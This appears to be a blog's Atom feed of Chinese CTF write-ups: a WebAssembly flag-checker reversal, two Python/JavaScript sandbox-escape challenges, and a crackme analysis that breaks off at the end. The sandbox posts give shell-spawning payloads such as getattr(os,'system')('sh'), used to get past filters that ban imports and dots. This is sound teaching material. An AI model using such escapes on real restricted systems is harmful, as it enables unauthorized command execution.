<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ios&#39;s blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://iosmosis.github.io/"/>
  <updated>2019-09-12T04:42:15.521Z</updated>
  <id>http://iosmosis.github.io/</id>
  
  <author>
    <name>ios</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>wasm逆向-真的是web</title>
    <link href="http://iosmosis.github.io/2019/07/25/wasm%E9%80%86%E5%90%91-%E7%9C%9F%E7%9A%84%E6%98%AFweb/"/>
    <id>http://iosmosis.github.io/2019/07/25/wasm逆向-真的是web/</id>
    <published>2019-07-25T02:52:55.000Z</published>
    <updated>2019-09-12T04:42:15.521Z</updated>
    
    <content type="html"><![CDATA[<p>拿到题目<br><img src="https://s2.ax1x.com/2019/08/02/ewMcTA.png" alt="ewMcTA.png"></p>
<p>给出三个文件</p>
<p>先进行简单运行测试</p>
<p><img src="https://s2.ax1x.com/2019/08/02/ewMyeH.png" alt="ewMyeH.png"></p>
<p>随意输入</p>
<p><img src="https://s2.ax1x.com/2019/08/02/ewM2FI.png" alt="ewM2FI.png"></p>
<p>逻辑很清晰</p>
<p>输入flag、 验证、返回是否正确</p>
<p>当然核心逻辑一定在test.wasm文件中</p>
<p>先利用wabt中的wasm2c 将wasm文件反编译成c文件</p>
<pre><code>┌─[ios@iosdeMacBook] - [~/wabt/out/clang/Debug] - [四  7 25, 11:01]
└─[$] &lt;git:(master*)&gt; ./wasm2c test.wasm -o test.c
</code></pre><p>执行完成命令后可以看到文件夹下面生成了一个test.c和一个test.h</p>
<p><img src="https://s2.ax1x.com/2019/08/02/ewMrOe.png" alt="ewMrOe.png"><br>接着放在wasm2c目录里进行编译</p>
<p><img src="https://s2.ax1x.com/2019/08/02/ewM6wd.png" alt="ewM6wd.png"></p>
<p>进行gcc编译</p>
<pre><code>gcc -g test.c -o test
</code></pre><p>发现会报错</p>
<p>因为很多wasm的函数并没有具体实现  因为我们主要目的是为了方便逆向，方便观察逻辑 所以我们只需要编译不做链接</p>
<pre><code>gcc -c test.c -o test
</code></pre><p>生成了test文件 接着我们拖进ida</p>
<p><img src="https://s2.ax1x.com/2019/08/02/ewMSII.png" alt="ewMSII.png"></p>
<pre><code> for ( i = 0; i &lt; (unsigned int)f81(v14); ++i )
  {
    v13 = v14 + i;
    v12 = (char)i32_load8_s(*Z_envZ_memory, v14 + i);
    if ( (signed int)i % 2 == 0 )
      i32_store8((_QWORD *)*Z_envZ_memory, v13, (v12 ^ 0x30) &amp; 0xFF);
    else
      i32_store8((_QWORD *)*Z_envZ_memory, v13, (v12 ^ 0x25) &amp; 0xFF);
  }
</code></pre><p>注意这段代码  </p>
<p>很明显是一段异或操作而且根据循环次数的奇偶做不同的异或。</p>
<p>根据wasm特性 会在底部存储字符串 所以我们可以利用这一特性去查找我们需要的字符串</p>
<pre><code>static const u8 data_segment_data_0[] = {
  0x67, 0x4a, 0x47, 0x7a, 0x69, 0x4a, 0x45, 0x7a, 0x42, 0x40, 0x51, 0x49, 
  0x5c, 0x5c, 0x6f, 0x6e, 0x00, 0x4b, 0x47, 0x7a, 0x67, 0x40, 0x52, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0xc0, 
  0x03, 0x00, 0x00, 0xc0, 0x04, 0x00, 0x00, 0xc0, 0x05, 0x00, 0x00, 0xc0, 
  0x06, 0x00, 0x00, 0xc0, 0x07, 0x00, 0x00, 0xc0, 0x08, 0x00, 0x00, 0xc0, 
  0x09, 0x00, 0x00, 0xc0, 0x0a, 0x00, 0x00, 0xc0, 0x0b, 0x00, 0x00, 0xc0, 
  0x0c, 0x00, 0x00, 0xc0, 0x0d, 0x00, 0x00, 0xc0, 0x0e, 0x00, 0x00, 0xc0, 
  0x0f, 0x00, 0x00, 0xc0, 0x10, 0x00, 0x00, 0xc0, 0x11, 0x00, 0x00, 0xc0, 
};
</code></pre><p>这里截取了最前一部分的字符串 因为直接hex可以看到下部字符串为good wrong 而上部无法解析 根据他主逻辑做了异或操作可以猜测 这些不解析的字符串就是加密后的flag</p>
<p>所以我们写出测试exp</p>
<pre><code>a=[0x67, 0x4a, 0x47, 0x7a, 0x69, 0x4a, 0x45, 0x7a, 0x42, 0x40, 0x51, 0x49, 
  0x5c, 0x5c, 0x6f, 0x6e, 0x00, 0x4b, 0x47, 0x7a, 0x67, 0x40, 0x52,0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0xc0, 
  0x03, 0x00, 0x00, 0xc0, 0x04, 0x00, 0x00, 0xc0, 0x05, 0x00, 0x00, 0xc0, 
  0x06, 0x00, 0x00, 0xc0, 0x07, 0x00, 0x00, 0xc0, 0x08, 0x00, 0x00, 0xc0, 
  0x09, 0x00, 0x00, 0xc0, 0x0a, 0x00, 0x00, 0xc0, 0x0b, 0x00, 0x00, 0xc0, 
  0x0c, 0x00, 0x00, 0xc0, 0x0d, 0x00, 0x00, 0xc0, 0x0e, 0x00, 0x00, 0xc0, 
  0x0f, 0x00, 0x00, 0xc0, 0x10, 0x00, 0x00, 0xc0, 0x11, 0x00, 0x00, 0xc0, 
  0x12, 0x00, 0x00, 0xc0, 0x13, 0x00, 0x00, 0xc0, 0x14, 0x00, 0x00, 0xc0, 
  0x15, 0x00, 0x00, 0xc0, 0x16, 0x00, 0x00, 0xc0, 0x17, 0x00, 0x00, 0xc0, 
  0x18, 0x00, 0x00, 0xc0, 0x19, 0x00, 0x00, 0xc0, 0x1a, 0x00, 0x00, 0xc0, 
  0x1b, 0x00, 0x00, 0xc0, 0x1c, 0x00, 0x00, 0xc0, 0x1d, 0x00, 0x00, 0xc0]
flag=&#39;&#39;
i=0
for i in range(0,55):
      if i%2==0:
          flag+=chr((a[i]^0x30)&amp; 0xFF)
      else:
          flag+=chr((a[i]^0x25)&amp; 0xFF)
print flag
</code></pre><p>运行查看结果</p>
<pre><code>└─[$] &lt;&gt; python was.py                
Wow_You_really_K0nw_Web%0%0%0%0%2%0?3%0?4%0?5%0?6%0?7
</code></pre><p>看到有明文字符串 这肯定就是flag了～</p>
<p>加入flag头提交即可</p>
<p>最后flag{Wow_You_really_K0nw_Web}</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;拿到题目&lt;br&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/08/02/ewMcTA.png&quot; alt=&quot;ewMcTA.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;给出三个文件&lt;/p&gt;
&lt;p&gt;先进行简单运行测试&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2
    
    </summary>
    
    
      <category term="Writeup" scheme="http://iosmosis.github.io/tags/Writeup/"/>
    
      <category term="Web" scheme="http://iosmosis.github.io/tags/Web/"/>
    
      <category term="RE" scheme="http://iosmosis.github.io/tags/RE/"/>
    
      <category term="wasm" scheme="http://iosmosis.github.io/tags/wasm/"/>
    
  </entry>
  
  <entry>
    <title>BCTF-2017 Monkey</title>
    <link href="http://iosmosis.github.io/2019/07/19/BCTF-2017-Monkey/"/>
    <id>http://iosmosis.github.io/2019/07/19/BCTF-2017-Monkey/</id>
    <published>2019-07-19T01:44:29.000Z</published>
    <updated>2019-09-12T04:43:31.853Z</updated>
    
    <content type="html"><![CDATA[<p>运行程序 发现是个沙箱</p>
<p>利用dir()查看引用的函数</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">js<span class="token operator">></span> dir<span class="token punctuation">(</span><span class="token punctuation">)</span>
typein<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">1</span> ReferenceError<span class="token punctuation">:</span> dir <span class="token keyword">is</span> <span class="token operator">not</span> defined
Stack<span class="token punctuation">:</span>
  @typein<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">1</span>
js<span class="token operator">></span>
</code></pre>
<p>没办法执行</p>
<p>思路：</p>
<p>如果不能查看调用怎么知道引用os模块了呢？</p>
<p>1.尝试import os</p>
<p>2.假设存在os直接调用</p>
<p>3.假设存在但是过滤.之类的无法直接调用</p>
<p>有了思路就可以开始尝试了</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>js&gt; import os
typein:1:0 SyntaxError: import declarations may only appear at top level of a module:
typein:1:0 import os
typein:1:0
</code></pre><p>SyntaxError：import声明只能出现在模块的顶层</p>
<p>也就是我们没办法在此使用import</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>js&gt; os
({getenv:function getenv() {
    [native code]
}, getpid:function getpid() {
    [native code]
}, system:function system() {
    [native code]
}, spawn:function spawn() {
    [native code]
}, kill:function kill() {
    [native code]
}, waitpid:function waitpid() {
    [native code]
}})
js&gt;
</code></pre><p>当我直接输入os时发现存在以下命令 最值得注意的是system命令 所以我们看看能不能执行os.system(‘sh’)</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">js<span class="token operator">></span> os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token punctuation">)</span>
typein<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">1</span> Error<span class="token punctuation">:</span> os<span class="token punctuation">.</span>system requires <span class="token number">1</span> argument
Stack<span class="token punctuation">:</span>
  @typein<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">1</span>
js<span class="token operator">></span> os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>
js  libnspr4<span class="token punctuation">.</span>so  libplc4<span class="token punctuation">.</span>so  libplds4<span class="token punctuation">.</span>so
<span class="token number">0</span>
js<span class="token operator">></span> os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'sh'</span><span class="token punctuation">)</span> 
$ ls
js  libnspr4<span class="token punctuation">.</span>so  libplc4<span class="token punctuation">.</span>so  libplds4<span class="token punctuation">.</span>so
$
</code></pre>
<p>可以看到成功调用system且拿到sh </p>
<p>那我们试试第三种情况能否使用</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">js<span class="token operator">></span> a<span class="token operator">=</span>getattr<span class="token punctuation">(</span>os<span class="token punctuation">,</span><span class="token string">"system"</span><span class="token punctuation">)</span>
typein<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">1</span> ReferenceError<span class="token punctuation">:</span> getattr <span class="token keyword">is</span> <span class="token operator">not</span> defined
Stack<span class="token punctuation">:</span>
  @typein<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">1</span>
js<span class="token operator">></span>
</code></pre>
<p>发现不能识别该函数所以没办法通过此方法绕过==</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;运行程序 发现是个沙箱&lt;/p&gt;
&lt;p&gt;利用dir()查看引用的函数&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;python&quot; data-line_number=&quot;frontend&quot; data-trim_indent=&quot;bac
    
    </summary>
    
    
      <category term="Writeup" scheme="http://iosmosis.github.io/tags/Writeup/"/>
    
      <category term="python" scheme="http://iosmosis.github.io/tags/python/"/>
    
      <category term="沙箱绕过" scheme="http://iosmosis.github.io/tags/%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>Escape_From_Jail-50</title>
    <link href="http://iosmosis.github.io/2019/07/18/Escape-From-Jail-50/"/>
    <id>http://iosmosis.github.io/2019/07/18/Escape-From-Jail-50/</id>
    <published>2019-07-18T09:50:39.000Z</published>
    <updated>2019-09-12T04:43:59.315Z</updated>
    
    <content type="html"><![CDATA[<p>python绕过题目</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token operator">==</span>
Rules<span class="token punctuation">:</span>
    <span class="token operator">-</span>No <span class="token keyword">import</span>
    <span class="token operator">-</span>No <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token operator">-</span>No flag


<span class="token operator">>></span><span class="token operator">></span> help

Documented commands <span class="token punctuation">(</span>type help <span class="token operator">&lt;</span>topic<span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
help

Undocumented commands<span class="token punctuation">:</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
EOF
</code></pre>
<p>题目给出了要求 不能使用import  不能使用 . 且不准出现flag字眼</p>
<p>这里需要思考一下 不用flag就行命令绕过了怎么读flag呢？</p>
<p>1.可以 cat * 然后自己找 貌似不太现实==</p>
<p>2.利用python读flag  可是不能出现flag字符</p>
<p>3.利用os模块自己起个shell 但是不准import</p>
<p>根据规则 应该是我们必须起一个shell 但是无法调用os是个大问题 </p>
<p>所以我们现在需要想办法在不使用import os的情况下执行os.system(‘/sh’)</p>
<p>利用dir()命令查看当前可以调用的模块</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>&gt;&gt;&gt; print(dir())
[&#39;Jail&#39;, &#39;__builtins__&#39;, &#39;__cached__&#39;, &#39;__doc__&#39;, &#39;__file__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;, &#39;cmd&#39;, &#39;execute&#39;, &#39;intro&#39;, &#39;os&#39;, &#39;sys&#39;, &#39;t&#39;]
&gt;&gt;&gt;
</code></pre><p>发现os已经导入并不需要import </p>
<p>可是我们还是无法执行因为os.system(‘/sh’)中含有.</p>
<p>思考：</p>
<p>有没有函数能不使用.就能使用其他函数？</p>
<p><a href="https://www.runoob.com/python/python-func-getattr.html" target="_blank" rel="external">https://www.runoob.com/python/python-func-getattr.html</a></p>
<p>找到一个</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">getattr<span class="token punctuation">(</span>object<span class="token punctuation">,</span> name<span class="token punctuation">[</span><span class="token punctuation">,</span> default<span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre>
<p>获取object中name的属性值</p>
<p>若存在则当前命令=name</p>
<p>所以我们获取os中system的属性值并且返回属性时执行system(‘sh’)</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>getattr(os,&quot;system&quot;)(&quot;sh&quot;) =system(&quot;sh&quot;)
</code></pre><p>当然如果不好理解也可以这么写</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>a=getattr(os,&quot;system&quot;)
a(&quot;sh&quot;)
</code></pre><p>成功拿到shell 接着就正常拿flag即可</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>cd home
cd ctf
cat flag
</code></pre><p>附一些好的python沙箱绕过文章</p>
<p><a href="https://www.anquanke.com/post/id/107000" target="_blank" rel="external">https://www.anquanke.com/post/id/107000</a></p>
<p><a href="https://www.jianshu.com/p/183581381c4f" target="_blank" rel="external">https://www.jianshu.com/p/183581381c4f</a></p>
<p><a href="https://www.xctf.org.cn/library/details/0df15ef620b075f288bdfc0ae6fe4eabe7cb996e/" target="_blank" rel="external">https://www.xctf.org.cn/library/details/0df15ef620b075f288bdfc0ae6fe4eabe7cb996e/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;python绕过题目&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;python&quot; data-line_number=&quot;frontend&quot; data-trim_indent=&quot;backend&quot; data-label_positi
    
    </summary>
    
    
      <category term="python" scheme="http://iosmosis.github.io/tags/python/"/>
    
      <category term="沙箱绕过" scheme="http://iosmosis.github.io/tags/%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>看雪CTF-Writeup</title>
    <link href="http://iosmosis.github.io/2019/03/11/%E7%9C%8B%E9%9B%AACTF-Writeup/"/>
    <id>http://iosmosis.github.io/2019/03/11/看雪CTF-Writeup/</id>
    <published>2019-03-11T15:15:57.000Z</published>
    <updated>2019-03-12T13:42:52.874Z</updated>
    
    <content type="html"><![CDATA[<h3 id="第一题-流浪者"><a href="#第一题-流浪者" class="headerlink" title="第一题 流浪者"></a>第一题 流浪者</h3><p>下载到程序 简单执行下 就是简单的creakerme ，需要输入正确验证码。</p>
<p>载入 ghidra 分析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">FUN_00401890</span><span class="token punctuation">(</span>CWnd <span class="token operator">*</span>param_1<span class="token punctuation">)</span>

<span class="token punctuation">{</span>

  <span class="token keyword">int</span> local_78 <span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  pCVar1 <span class="token operator">=</span> param_1 <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">;</span>
  local_8 <span class="token operator">=</span> param_1<span class="token punctuation">;</span>
  this <span class="token operator">=</span> <span class="token function">GetDlgItem</span><span class="token punctuation">(</span>param_1<span class="token punctuation">,</span><span class="token number">0x3ea</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">GetWindowTextA</span><span class="token punctuation">(</span>this<span class="token punctuation">,</span><span class="token punctuation">(</span>CString <span class="token operator">*</span><span class="token punctuation">)</span>pCVar1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  iVar2 <span class="token operator">=</span> <span class="token function">FUN_00401a30</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>local_8 <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  local_c <span class="token operator">=</span> <span class="token function">GetBuffer</span><span class="token punctuation">(</span><span class="token punctuation">(</span>CString <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>local_8 <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>iVar2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  sVar3 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>local_c<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>sVar3 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">MessageBoxA</span><span class="token punctuation">(</span>local_8<span class="token punctuation">,</span><span class="token operator">&amp;</span>DAT_004035dc<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token punctuation">{</span>
    local_10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">58</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token number">47</span> <span class="token operator">&lt;</span> local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        local_78<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">0x30</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">123</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token number">96</span> <span class="token operator">&lt;</span> local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          local_78<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">0x57</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">91</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token number">64</span> <span class="token operator">&lt;</span> local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            local_78<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>local_c<span class="token punctuation">[</span>local_10<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">0x1d</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
          <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token function">FUN_004017b0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//返回错误</span>
          <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
      local_10 <span class="token operator">=</span> local_10 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">FUN_004017f0</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>local_78<span class="token punctuation">)</span><span class="token punctuation">;</span> 得到的local_78数组传入到FUN_004017f0函数
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>程序从文本框获取到字符串、然后判断是否为空 如果为空 弹窗 程序结束</p>
<p>可以看到接收长度为26 //  int local_78 [26]；</p>
<p>然后是对接收到的字符串进行判断并进行运算操作</p>
<p>进入FUN_004017f0</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>void __cdecl FUN_004017f0(int param_1)

{
  int iVar1; 
  char local_28 [28];
  undefined4 local_c;
  int local_8;
  // param_1为上函数运算得到的数组
  local_8 = 0;
  local_c = 0;
  while ((*(int *)(param_1 + local_8 * 4) &lt; 0x3e &amp;&amp; (-1 &lt; *(int *)(param_1 + local_8 * 4)))) {
    local_28[local_8] =
         &quot;abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ&quot;
         [*(int *)(param_1 + local_8 * 4)];
    local_8 = local_8 + 1;
  }
  local_28[local_8] = 0;
  iVar1 = strcmp(local_28,&quot;KanXueCTF2019JustForhappy&quot;);
  if (iVar1 == 0) {
    FUN_00401770();//返回pass
  }
  else {
    FUN_004017b0();//返回错误
  }
  return;
}
</code></pre><p>从</p>
<p>iVar1 = strcmp(local_28,”KanXueCTF2019JustForhappy”);</p>
<p>可以得到  local_28的值为 KanXueCTF2019JustForhappy</p>
<p> 又可以看到 </p>
<p>  local_28[local_8] =<br>“abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ”<br>[<em>(int </em>)(param_1 + local_8 * 4)];</p>
<p> local_28[local_8] 数组的每一位是从这段字符串中取出 取出位置由param_1决定</p>
<p> 所以在当前函数 已知 local_28  已知字符串 求param_1</p>
<p>re.c</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token string">"KanXueCTF2019JustForhappy"</span><span class="token punctuation">;</span>
   <span class="token keyword">char</span> b<span class="token punctuation">[</span><span class="token number">62</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ"</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> c<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token keyword">int</span> d<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
   <span class="token keyword">while</span> <span class="token punctuation">(</span>d<span class="token operator">&lt;</span><span class="token number">25</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
           <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>a<span class="token punctuation">[</span>d<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
               c<span class="token punctuation">[</span>d<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>
              <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d,"</span><span class="token punctuation">,</span>c<span class="token punctuation">[</span>d<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
               d<span class="token operator">=</span>d<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
               <span class="token comment" spellcheck="true">//break ;</span>
           <span class="token punctuation">}</span>

       <span class="token punctuation">}</span>
   <span class="token punctuation">}</span>
</code></pre>
<p>得到param_1</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
